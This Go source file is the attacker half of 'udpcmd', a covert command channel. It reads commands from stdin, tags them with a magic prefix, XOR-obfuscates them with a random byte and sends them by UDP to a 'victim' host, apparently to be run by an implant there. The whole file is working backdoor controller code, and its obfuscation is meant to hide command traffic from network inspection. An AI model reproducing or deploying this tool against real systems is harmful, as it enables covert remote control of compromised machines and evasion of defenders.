package main

/*
 * attacker.go
 * Attacker side of udpcmd
 * By J. Stuart McMurray
 * Created 20160221
 * Last Modified 20160221
 */

import (
	"bufio"
	"crypto/rand"
	"log"
	"net"
	"os"
)

/* attacker reads lines from stdin, packs them up, and sends them to the
victim at addr. */
func attacker(addr string) {
	/* Create a socket pointing to the victim */
	c, err := net.Dial("udp", addr)
	if nil != err {
		log.Fatalf("Unable to make UDP socket for %q: %v", addr, err)
	}

	/* Read lines from stdin, send them off */
	log.Printf("Ready to send to %v", c.RemoteAddr())
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		send(scanner.Bytes(), c)
	}
	if err := scanner.Err(); err != nil {
		log.Fatalf("Error reading input: %v", err)
	}
}

/* send prepares and sends the contents of the buffer to the connection */
func send(buf []byte, c net.Conn) {
	/* Check data size */
	if len(buf) > (MSGLEN - (1 + len(MAGIC))) {
		log.Printf(
			"%q is too long.  It must be <= %v bytes",
			buf,
			MSGLEN-(1+len(MAGIC)),
		)
		return
	}
	/* Prepend magic */
	obuf := make([]byte, MSGLEN-1)
	for i, v := range MAGIC {
		obuf[i] = v
	}
	for i, v := range buf {
		obuf[i+len(MAGIC)] = v
	}
	/* Send it, for testing */
	if n, err := c.Write(makeXOR(obuf)); nil != err {
		log.Printf("Send (%v/%v): %v", n, len(obuf), err)
	}
	log.Printf("Sent.")
}

/* makeXOR XORs a buffer with a random byte, and returns a slice with the byte
prepended. */
func makeXOR(buf []byte) []byte {
	/* Random byte to xor */
	xors := make([]byte, 1)
	if _, err := rand.Read(xors); nil != err {
		log.Fatalf("Unable to read random XOR byte: %v", err)
	}
	xorb := xors[0]

	/* Output buffer */
	obuf := make([]byte, len(buf)+1)

	/* Pack the output buffer */
	obuf[0] = xorb
	for i, v := range buf {
		obuf[i+1] = v ^ xorb
	}

	return obuf
}
